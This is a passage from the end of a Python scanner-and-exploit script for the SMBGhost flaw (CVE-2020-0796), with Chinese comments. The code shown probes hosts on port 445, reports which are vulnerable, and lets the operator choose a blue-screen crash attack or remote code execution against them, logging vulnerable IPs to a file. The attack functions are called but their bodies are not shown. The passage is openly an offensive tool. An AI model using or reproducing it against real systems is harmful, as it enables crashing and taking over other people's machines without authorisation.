                        print("[\033[31m-\033[0m]IP %s Not Vulnerable"% IP) #如果存在则显示此行 
                    elif recv[68:72] == exploitCheck: 
                        print("[\033[32minfo\033[0mIP %s Vulnerable"% IP) #如果不存在则显示此行
                        exp=input("[\033[33minfo\033[0m](B)ule screen attack or (C)ontrol the other party please choose#")
                        if exp == "B" or exp == "b":
                            bule_screen(IP, username="fakeuser", password="fakepass", encode=False);test_host(IP)
                        elif exp == "C" or exp == "c":
                            do_rce(IP, port)
                        with open(os.getcwd()+"/cve_2020_0796-host.txt",mode="a") as f: #保存显示有漏洞的主机,os.getcwd()函数是显示终端所在的路径
                            for i in "%s"%(IP): #循环..
                                f.write(i) #写入
                            f.close()
            else: #判断
                print("[\033[31m-\033[0m]IP %s PARTY DID NOT OPEN PORT 445"% IP) #如果对方没有打开445则显示此行
    except KeyboardInterrupt: #当ctrl+c时则执行此行
        print("[\033[33m-\033[0m]byebye!")
        exit(1) #退出代码为1，就是异常退出
    except ConnectionResetError: #如果连接失败则显示此行
        print("[\033[33m-\033[0m]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT")
    except socket.gaierror:
        print("[\033[33m-\033[0m]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT")
    except socket.timeout:
        print("[\033[33m-\033[0m]CONNECTION THE SERVER TIMEOUT")

if __name__ == "__main__":
    mode()
